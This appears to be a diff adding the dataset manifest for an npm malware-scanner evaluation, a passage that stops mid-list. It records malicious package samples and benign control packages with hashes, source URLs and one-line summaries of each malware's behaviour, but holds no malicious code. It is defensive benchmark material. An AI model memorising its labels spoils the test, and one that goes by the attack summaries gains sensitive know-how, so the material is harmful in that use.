@@ -1,0 +1,3873 @@
+{
+  "schemaVersion": 1,
+  "generatedAt": "2026-11-12T09:20:25.628Z",
+  "runtime": {
+    "node": "v24.22.1",
+    "platform": "win32",
+    "arch": "x64"
+  },
+  "interpretation": "Fresh selected exact-version cohort with unchanged frozen scanner; not a random representative accuracy estimate. All selected artifacts acquired and prepared before first scan. No package code executed.",
+  "protocol": {
+    "sourceFrozenAt": "2026-11-12T09:15:33.752Z",
+    "cohortFrozenAt": "2026-11-12T09:18:54.373Z",
+    "observedHistoricalCoordinates": 235,
+    "ruleChanges": false,
+    "sampleExecution": false,
+    "sourceFingerprint": "0e0d3b94b25cb9478af18c9524928dc2ed631d7e336f62ca5c1a8ecbe06f067f",
+    "selectionHashes": [
+      {
+        "path": "malicious-selection.json",
+        "sha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967"
+      },
+      {
+        "path": "benign-selection.json",
+        "sha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6"
+      }
+    ]
+  },
+  "dataset": {
+    "id": "fresh-fixed-scanner-20261112",
+    "kind": "real",
+    "sha256": "ce1619e7feb33c8572d18216f062b124d4cdeae6816b4be9785914a37cd47d35",
+    "samples": [
+      {
+        "id": "node-ipc-12.0.1",
+        "name": "node-ipc",
+        "version": "12.0.1",
+        "family": "node-ipc-dns-exfiltration-2026",
+        "label": "malicious",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/compromised_lib/node-ipc/12.0.1/2026-05-14-node-ipc-v12.0.1.zip",
+          "labelEvidence": "https://securitylabs.datadoghq.com/articles/node-ipc-npm-malware-analysis/ — Compromised CommonJS entrypoint collects developer credentials and exfiltrates them using DNS queries.",
+          "capturedAt": "2026-11-12T09:18:54.375Z",
+          "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "repacked-source",
+          "originalArtifactSha256": "49dae8e1c1a92816bbf262b4dca15339402bed8e67b6cbb13c89e2c58e294c5e",
+          "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+          "sourceGitBlob": "c847639adc33e69e9b346c3b6942c54bb4c2c960",
+          "fileHashesSha256": "c1119b9e61b06dac081d11d5d837a670def42590c8384e139ea3dabf55011f9d",
+          "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "node-ipc-12.0.1/manifest.json",
+            "sha256": "8e56da8b1d7356decc3604361a98d9f2d80bcf0a30cd918a823697f46cd14949"
+          },
+          "readme": {
+            "path": "node-ipc-12.0.1/README.md",
+            "sha256": "cbdafa855b24b29e8e9ed3315398511becaac21a6cc363d32df77d78e5e5bccf"
+          },
+          "tarball": {
+            "path": "node-ipc-12.0.1/package.tgz",
+            "sha256": "ff71c973a6a1924ef330da7473ec9cab31ca4ffafdf3f4e8c252dac84a42fdd7"
+          }
+        }
+      },
+      {
+        "id": "nodelogic-1.0.0",
+        "name": "nodelogic",
+        "version": "1.0.0",
+        "family": "mut-8694-windows-infostealer-2024",
+        "label": "malicious",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/nodelogic/1.0.0/2024-10-16-nodelogic-v1.0.0.zip",
+          "labelEvidence": "https://securitylabs.datadoghq.com/articles/mut-8964-an-npm-and-pypi-malicious-campaign-targeting-windows-users/ — Obfuscated postinstall downloader delivers Windows infostealers while posing as an API/DLL repair utility.",
+          "capturedAt": "2026-11-12T09:18:55.531Z",
+          "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "repacked-source",
+          "originalArtifactSha256": "00b56ecc22258af220c3e1489501d33ec007ca45f3eeae6250bb62ab0297bbad",
+          "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+          "sourceGitBlob": "62f63ceab0caff0a75499f89968973defc6faea7",
+          "fileHashesSha256": "79320139f678dac8fe822da5a9b0c91e6089b87779f3cbad2657a6197777fecf",
+          "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "nodelogic-1.0.0/manifest.json",
+            "sha256": "346d10c12ad1a75ea50677476bcfa420923d88b9f313a9654ce8d2e6ba47e9a1"
+          },
+          "readme": {
+            "path": "nodelogic-1.0.0/README.md",
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          },
+          "tarball": {
+            "path": "nodelogic-1.0.0/package.tgz",
+            "sha256": "a47856787b91192ce308779ab57541e44e96f2e9aea0c07c85fff84b1a619d38"
+          }
+        }
+      },
+      {
+        "id": "rspack-core-1.1.7",
+        "name": "@rspack/core",
+        "version": "1.1.7",
+        "family": "rspack-compromise-mut-1692-2024",
+        "label": "malicious",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/compromised_lib/@rspack@core/1.1.7/2024-12-20-@rspack_core-v1.1.7.zip",
+          "labelEvidence": "https://github.com/web-infra-dev/rspack/issues/8767 — Maintainer-confirmed compromised release with malicious install scripts; independent research reports cryptomining and credential theft.",
+          "capturedAt": "2026-11-12T09:18:56.424Z",
+          "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "repacked-source",
+          "originalArtifactSha256": "ccb55d450eef5dec8732fbe4d9df92b31511198ab38b00ab1c50dbb83bdcd34d",
+          "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+          "sourceGitBlob": "d75e4a92cf2d7c7e979a3d1eee20aada487d05e6",
+          "fileHashesSha256": "cb52f0cb6f5c28d20166405dd695d6066fe8766b100a8807bebecab4ee720815",
+          "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "rspack-core-1.1.7/manifest.json",
+            "sha256": "3339ae15f26b8358c8fbfdc5895b06ded8c756bcb8242d5bc9a89b3ebec21eae"
+          },
+          "readme": {
+            "path": "rspack-core-1.1.7/README.md",
+            "sha256": "c6a06309e500a96d2696fee7c81f0ab1fa3bbea70888bb259e93bcae43e6d9ea"
+          },
+          "tarball": {
+            "path": "rspack-core-1.1.7/package.tgz",
+            "sha256": "c6a635aa27055473d521afcc6a3fa62eaf3e772eb640928b1af87b8044a9222f"
+          }
+        }
+      },
+      {
+        "id": "0xengine-xmlrpc-1.3.18",
+        "name": "@0xengine/xmlrpc",
+        "version": "1.3.18",
+        "family": "xmlrpc-credential-theft-cryptomining-2024",
+        "label": "malicious",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/@0xengine@xmlrpc/1.3.18/2024-10-08-@0xengine_xmlrpc-v1.3.18.zip",
+          "labelEvidence": "https://zero.checkmarx.com/dozens-of-machines-infected-year-long-npm-supply-chain-attack-combines-crypto-mining-and-data-0c674ac4dcbd — Obfuscated credential theft and cryptocurrency mining; exfiltration through Dropbox and file.io.",
+          "capturedAt": "2026-11-12T09:18:57.366Z",
+          "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "repacked-source",
+          "originalArtifactSha256": "010b796380949f602f747d098f996fa1d4614588d02cec0ecd93eeea61825ea9",
+          "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+          "sourceGitBlob": "0198850db71762a08c103f625d2d5040836ce5f1",
+          "fileHashesSha256": "f1a697f5b83c75e9607b88b7e534164500c741a8f395222480e0653b43c07f43",
+          "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "0xengine-xmlrpc-1.3.18/manifest.json",
+            "sha256": "107eb3440ec9192a6586dc842f03c57c4a171e9978a46e3555644c64a78d7d0d"
+          },
+          "readme": {
+            "path": "0xengine-xmlrpc-1.3.18/README.md",
+            "sha256": "0f04b5ab9556926df3551973f050b594043fcdb08d715105355039d8975e1b5d"
+          },
+          "tarball": {
+            "path": "0xengine-xmlrpc-1.3.18/package.tgz",
+            "sha256": "ba5185744d3d65c06d9070d8fa491fe40761dee6f6ace90b99994f60a5176d49"
+          }
+        }
+      },
+      {
+        "id": "ethereumvulncontracthandler-1.3.0",
+        "name": "ethereumvulncontracthandler",
+        "version": "1.3.0",
+        "family": "ethereum-tool-quasar-rat-2024",
+        "label": "malicious",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/ethereumvulncontracthandler/1.3.0/2024-12-19-ethereumvulncontracthandler-v1.3.0.zip",
+          "labelEvidence": "https://socket.dev/blog/quasar-rat-disguised-as-an-npm-package — Fake Ethereum vulnerability tool uses an obfuscated downloader to deploy Quasar RAT on Windows.",
+          "capturedAt": "2026-11-12T09:18:57.731Z",
+          "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "repacked-source",
+          "originalArtifactSha256": "c49f888fb4967e3929ed1f3b66e5d3f14cf7737d17d63b2ac856f7fb4508154c",
+          "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+          "sourceGitBlob": "89c53830031e22b830ddc6deb4132c6181e98c63",
+          "fileHashesSha256": "8fafda8f4eaf38924db4a8f998c364b45e1f3bdbbc79980a4011bf9a30e84f44",
+          "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "ethereumvulncontracthandler-1.3.0/manifest.json",
+            "sha256": "1becb8cbc13e5e935d965a0fc04716d02803c98023a3ecdaacb3f25b78a0299f"
+          },
+          "readme": {
+            "path": "ethereumvulncontracthandler-1.3.0/README.md",
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          },
+          "tarball": {
+            "path": "ethereumvulncontracthandler-1.3.0/package.tgz",
+            "sha256": "08325411bafa6e97d1ec7fda8472eac5befac37d5f951ce8c6ba277f3af7172e"
+          }
+        }
+      },
+      {
+        "id": "slf4j-api-js-1.0.0",
+        "name": "slf4j-api-js",
+        "version": "1.0.0",
+        "family": "cross-ecosystem-impersonation-2025",
+        "label": "malicious",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/slf4j-api-js/1.0.0/2025-04-21-slf4j-api-js-v1.0.0.zip",
+          "labelEvidence": "https://socket.dev/blog/npm-targeted-by-malware-campaign-mimicking-familiar-library-names — Member of an obfuscated cross-ecosystem impersonation campaign involving environment theft and remote code execution.",
+          "capturedAt": "2026-11-12T09:18:58.038Z",
+          "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "repacked-source",
+          "originalArtifactSha256": "e33e55ae02a94f12e5e18da5cb682cacc2e8878df499074e6314423c03079629",
+          "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+          "sourceGitBlob": "1459762d77928c8719c58449a41aa7894c647b53",
+          "fileHashesSha256": "e196c22c8865e567e3845654f9edd53753ed82b232de0bc4e7c037e8a3eab453",
+          "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "slf4j-api-js-1.0.0/manifest.json",
+            "sha256": "e2c9d4a7e1904dfa299a3465ab93e445b666e119d11e4154cc7360be4c821fcf"
+          },
+          "readme": {
+            "path": "slf4j-api-js-1.0.0/README.md",
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          },
+          "tarball": {
+            "path": "slf4j-api-js-1.0.0/package.tgz",
+            "sha256": "27e57d6fce792400913cbf2cb82cd93355e72bcbee9cd5af39fb91ae877c94f6"
+          }
+        }
+      },
+      {
+        "id": "xlsx-to-json-lh-0.5.2",
+        "name": "xlsx-to-json-lh",
+        "version": "0.5.2",
+        "family": "xlsx-remote-destructive-backdoor",
+        "label": "malicious",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/xlsx-to-json-lh/0.5.2/2025-03-30-xlsx-to-json-lh-v0.5.2.zip",
+          "labelEvidence": "https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger — Trojanized Excel converter waits on a socket.io command channel and can recursively delete the victim project.",
+          "capturedAt": "2026-11-12T09:18:58.368Z",
+          "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "repacked-source",
+          "originalArtifactSha256": "6bf0a85ef84ed035d6ef9e91601328e4d7e2a0a7c249490110e5344052cdf8ec",
+          "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+          "sourceGitBlob": "32cc778d2ea76659907cc4b8efc3fbf3e0847d19",
+          "fileHashesSha256": "d75748bb257537aa41c3eed8213747b9aef1e59cbc82a38ab09cfa701b35be01",
+          "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "xlsx-to-json-lh-0.5.2/manifest.json",
+            "sha256": "c0b4df18bf78988f62171ad061446f171211e4c38b96beaaa060969aff8f3a1d"
+          },
+          "readme": {
+            "path": "xlsx-to-json-lh-0.5.2/README.md",
+            "sha256": "037bf60ed01ed019aa729308e2d1c631e21e1341256ccbd0a6ed04f54826f5b8"
+          },
+          "tarball": {
+            "path": "xlsx-to-json-lh-0.5.2/package.tgz",
+            "sha256": "e230bc6b5ad1300c0994be68fd4ca977726bfeb458198516d2f4109c5d8ea96b"
+          }
+        }
+      },
+      {
+        "id": "crypto-encrypt-ts-5.4.5",
+        "name": "crypto-encrypt-ts",
+        "version": "5.4.5",
+        "family": "cryptojs-impersonation-betterstack-theft-2025",
+        "label": "malicious",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/crypto-encrypt-ts/5.4.5/2025-04-26-crypto-encrypt-ts-v5.4.5.zip",
+          "labelEvidence": "https://www.sonatype.com/blog/revived-cryptojs-library-is-a-crypto-stealer-in-disguise — CryptoJS impersonator retrieves wallet private keys and exfiltrates them through Better Stack, with scheduled persistence.",
+          "capturedAt": "2026-11-12T09:18:58.670Z",
+          "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "repacked-source",
+          "originalArtifactSha256": "f04e548b73594c69aae9fc110453ae7b01631978e6112cea34c16295d8978b09",
+          "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+          "sourceGitBlob": "4dba8651b9f591eedad629f1c906db0524920ec5",
+          "fileHashesSha256": "10e0214b5fcf6cd8bb70bb6b0f44893345fce5ecf902f97ef1f7a49e34bd3b8d",
+          "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "crypto-encrypt-ts-5.4.5/manifest.json",
+            "sha256": "aedfa13bdd8023e956f2741d0b7f27afb9262d3dec6d2a56caaf6ab23f88849c"
+          },
+          "readme": {
+            "path": "crypto-encrypt-ts-5.4.5/README.md",
+            "sha256": "3141d8b864d6b0dac8d45b883fa3936fef55c7f6b6f79e73b89bef7feac33f6c"
+          },
+          "tarball": {
+            "path": "crypto-encrypt-ts-5.4.5/package.tgz",
+            "sha256": "4c17cd6a7d48ccbb6ef68a47a228103852a2367f316a0770d5260049c8d9dc51"
+          }
+        }
+      },
+      {
+        "id": "aws-sdk-client-s3-3.758.0",
+        "name": "@aws-sdk/client-s3",
+        "version": "3.758.0",
+        "family": "fresh-benign-aws-cloud-sdk",
+        "label": "benign",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://registry.npmjs.org/@aws-sdk/client-s3/-/client-s3-3.758.0.tgz",
+          "labelEvidence": "https://docs.aws.amazon.com/AWSJavaScriptSDK/v3/latest/Package/-aws-sdk-client-s3/ — Official AWS S3 client; legitimate authenticated cloud HTTP requests and credential-provider integration. Provisional benign challenge control.",
+          "capturedAt": "2026-11-12T09:18:58.994Z",
+          "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "published-tarball",
+          "registryManifestSha256": "2628b5b8614a4379862b900ebfa3fc230d747c41dac0fc3f1abdddcfeb6e4cb8",
+          "publishedIntegrityVerified": true,
+          "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "aws-sdk-client-s3-3.758.0/manifest.json",
+            "sha256": "30842e137ca9964650de85832799d642a7beaa0c869a3d0a5075e1ba5a342ed9"
+          },
+          "readme": {
+            "path": "aws-sdk-client-s3-3.758.0/README.md",
+            "sha256": "751879bd79328b3d644b37944d7ad4555bf756407d9430faa48a777926337fa5"
+          },
+          "tarball": {
+            "path": "aws-sdk-client-s3-3.758.0/package.tgz",
+            "sha256": "eff068d91521c72c72544481c936e73c323a7e0cf2fcc5362718039300060f0a"
+          }
+        }
+      },
+      {
+        "id": "opentelemetry-sdk-node-0.57.2",
+        "name": "@opentelemetry/sdk-node",
+        "version": "0.57.2",
+        "family": "fresh-benign-opentelemetry-node-instrumentation",
+        "label": "benign",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://registry.npmjs.org/@opentelemetry/sdk-node/-/sdk-node-0.57.2.tgz",
+          "labelEvidence": "https://opentelemetry.io/docs/languages/js/getting-started/nodejs/ — Official Node observability SDK; legitimate instrumentation and telemetry initialization with configurable exporters. Provisional benign challenge control.",
+          "capturedAt": "2026-11-12T09:19:00.703Z",
+          "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "published-tarball",
+          "registryManifestSha256": "17bccaa88a7c280e1589e0393f1bb0ce8d6860999b98ff833f090f4442cbaf43",
+          "publishedIntegrityVerified": true,
+          "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "opentelemetry-sdk-node-0.57.2/manifest.json",
+            "sha256": "00c736e1a2da1aca60e1fc8d877ca6052755b06cf34f5e18063e0e6ac952a0dc"
+          },
+          "readme": {
+            "path": "opentelemetry-sdk-node-0.57.2/README.md",
+            "sha256": "1160cc46c14f53994a1c0e56bb1deb55c1b5249a5b76d76b1c43f3c74bebe6e3"
+          },
+          "tarball": {
+            "path": "opentelemetry-sdk-node-0.57.2/package.tgz",
+            "sha256": "5ec1450499b54bc0cf9b2f09a2aeb603a68f2a5d9f2df6c468a9424042f6b411"
+          }
+        }
+      },
+      {
+        "id": "nodemailer-6.10.1",
+        "name": "nodemailer",
+        "version": "6.10.1",
+        "family": "fresh-benign-mail-transport",
+        "label": "benign",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://registry.npmjs.org/nodemailer/-/nodemailer-6.10.1.tgz",
+          "labelEvidence": "https://nodemailer.com/ — Established mail library; legitimate SMTP authentication, DKIM signing, attachments and Sendmail transport. Provisional benign challenge control.",
+          "capturedAt": "2026-11-12T09:19:01.811Z",
+          "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "published-tarball",
+          "registryManifestSha256": "67a21411676841980eafa274306d91c112410779f56edb0262eb8dbd1fa3e6b7",
+          "publishedIntegrityVerified": true,
+          "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "nodemailer-6.10.1/manifest.json",
+            "sha256": "4d84fb0febcd26afb2ac5c9e5425ea07c99a019b700ad6aa90e21bd105fe7049"
+          },
+          "readme": {
+            "path": "nodemailer-6.10.1/README.md",
+            "sha256": "5ae480bf9c8522e16b78341908dc2bf6d2b49d32bcc7a565e25da1d026b9750e"
+          },
+          "tarball": {
+            "path": "nodemailer-6.10.1/package.tgz",
+            "sha256": "17adb75117b99b76019f2d571e1cc81ffe02d68d7d381f3cd2a41be1fffffb76"
+          }
+        }
+      },
+      {
+        "id": "electron-get-3.1.0",
+        "name": "@electron/get",
+        "version": "3.1.0",
+        "family": "fresh-benign-electron-downloader",
+        "label": "benign",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://registry.npmjs.org/@electron/get/-/get-3.1.0.tgz",
+          "labelEvidence": "https://github.com/electron/get — Electron-maintained release-artifact downloader; legitimate network downloads, cache/filesystem access and checksum verification. Provisional benign challenge control.",
+          "capturedAt": "2026-11-12T09:19:02.256Z",
+          "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "published-tarball",
+          "registryManifestSha256": "dd6f2981942bccef59a913bd8c3bd638405b505483de3ff8e53084097ebe14c3",
+          "publishedIntegrityVerified": true,
+          "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "electron-get-3.1.0/manifest.json",
+            "sha256": "444cf43a1be5b510f4af26cc6c4158e77c501c657e6b32b95a460aca8a551379"
+          },
+          "readme": {
+            "path": "electron-get-3.1.0/README.md",
+            "sha256": "768e2e620d7ee289d0743ed65a02f389b27e66653d690950731ec1c14474c574"
+          },
+          "tarball": {
+            "path": "electron-get-3.1.0/package.tgz",
+            "sha256": "cc60cc0d830923b652f1c8510f26779ddeaab7c7a4941362798920ff970dfb38"
+          }
+        }
+      },
+      {
+        "id": "sharp-0.34.1",
+        "name": "sharp",
+        "version": "0.34.1",
+        "family": "fresh-benign-native-image-library",
+        "label": "benign",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://registry.npmjs.org/sharp/-/sharp-0.34.1.tgz",
+          "labelEvidence": "https://sharp.pixelplumbing.com/ — Official native image-processing package; legitimate native dependency and platform/build selection logic. Provisional benign challenge control; ordinary vulnerabilities are outside this label.",
+          "capturedAt": "2026-11-12T09:19:02.745Z",
+          "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "published-tarball",
+          "registryManifestSha256": "451ce1ef17ab971fbc61fecc4b44b0f25b26128d1b61a5c02cd42b9f77072df6",
+          "publishedIntegrityVerified": true,
+          "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "sharp-0.34.1/manifest.json",
+            "sha256": "2b8cac2b598219468dcd7735217da04e7233f72faca590d82c3f705a97c145c9"
+          },
+          "readme": {
+            "path": "sharp-0.34.1/README.md",
+            "sha256": "fb201555a3cea45c69cc89431c5a0dcc68d1c25e2e5c5ea3ae72b52cf27521b0"
+          },
+          "tarball": {
+            "path": "sharp-0.34.1/package.tgz",
+            "sha256": "7d6f6ee6a85ae29921bba47e9dd4fae40c316fa9a1bc28e0b6049f3179e64bff"
+          }
+        }
+      },
+      {
+        "id": "webpack-5.99.8",
+        "name": "webpack",
+        "version": "5.99.8",
+        "family": "fresh-benign-build-tool",
+        "label": "benign",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://registry.npmjs.org/webpack/-/webpack-5.99.8.tgz",
+          "labelEvidence": "https://webpack.js.org/ — Official bundler; legitimate generated JavaScript, dynamic module-loading forms and compiler infrastructure. Provisional benign challenge control.",
+          "capturedAt": "2026-11-12T09:19:03.162Z",
+          "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "published-tarball",
+          "registryManifestSha256": "efb908acd68c3d4fa997491275185857eb557e1228cbd6ee335dc9d1514ad930",
+          "publishedIntegrityVerified": true,
+          "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "webpack-5.99.8/manifest.json",
+            "sha256": "23d5c8b97f25a668989cbd6d7c7fc1b9b08265060d0fbdf08f568e2f1bcafd0d"
+          },
+          "readme": {
+            "path": "webpack-5.99.8/README.md",
+            "sha256": "3fca03105facc04aaa84b3cd27ce74ebf21c338c2d09216c714dd177fef8d8a6"
+          },
+          "tarball": {
+            "path": "webpack-5.99.8/package.tgz",
+            "sha256": "0476665eee672dc56cffc7338ee02d99ccf3c973780f304a02ff40e0d4850ee3"
+          }
+        }
+      },
+      {
+        "id": "ethers-6.13.5",
+        "name": "ethers",
+        "version": "6.13.5",
+        "family": "fresh-benign-ethereum-wallet-sdk",
+        "label": "benign",
+        "split": "test",
+        "provenance": {
+          "sourceUrl": "https://registry.npmjs.org/ethers/-/ethers-6.13.5.tgz",
+          "labelEvidence": "https://docs.ethers.org/v6/ — Official Ethereum library; legitimate local keys, mnemonic handling, signatures and RPC transport. Provisional benign challenge control for private-material flow rules.",
+          "capturedAt": "2026-11-12T09:19:03.918Z",
+          "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+          "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+          "archiveKind": "published-tarball",
+          "registryManifestSha256": "9a397392e166a58c36e055927cfd831eebc37d680d2598eedd884622f78d2b56",
+          "publishedIntegrityVerified": true,
+          "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+        },
+        "artifacts": {
+          "manifest": {
+            "path": "ethers-6.13.5/manifest.json",
+            "sha256": "33501e3a6e0e9e3088ce5e2c5182eff60131f79222fd90de5f61528f3f33ae69"
+          },
+          "readme": {
+            "path": "ethers-6.13.5/README.md",
+            "sha256": "09eb62091d74aaef9f1cc3d750a536480f8be5581e6e4b182594a53b510cc83e"
+          },
+          "tarball": {
+            "path": "ethers-6.13.5/package.tgz",
+            "sha256": "0aeaa5a4f86b7e97cf34d5fa42ac7885100948d5183971705712fbfac345bab3"
+          }
+        }
+      },
+      {
